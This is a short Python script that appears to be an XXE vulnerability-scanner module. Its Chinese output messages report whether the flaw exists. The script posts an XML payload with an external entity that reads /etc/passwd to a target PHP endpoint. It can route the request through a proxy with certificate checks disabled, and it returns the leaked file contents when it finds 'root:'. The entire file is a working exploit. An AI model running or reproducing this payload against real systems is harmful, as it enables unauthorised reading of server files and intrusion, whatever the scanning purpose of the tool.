import requests
import time
from bs4 import BeautifulSoup
import logging

cdd=''
http = ''
https = ''
def dl18(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    url2='simplexml_load_string.php'
    url3 = url1 + url2
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        data="""<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><name>&xxe;</name></root>"""
        logging.captureWarnings(True)
        aa = requests.post(url3,cookies=s_cookie,data=data,proxies=proxies,verify=False,timeout=5)
        aa.encoding = 'utf-8'
        cd = BeautifulSoup(aa.text, 'html.parser')
        if 'root:' in cd.text:
            cdd=cd.text
        else:
            cdd='[-]漏洞不存在'
    except Exception as aaa:
        cdd='[-]请求错误\n'+str(aaa)
def jg9():
    global cdd
    return '--------------------------------------------------\n[ XML外部实体注入漏洞（XXE）]\n\n'+ str (cdd)+'\n'
def u9(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)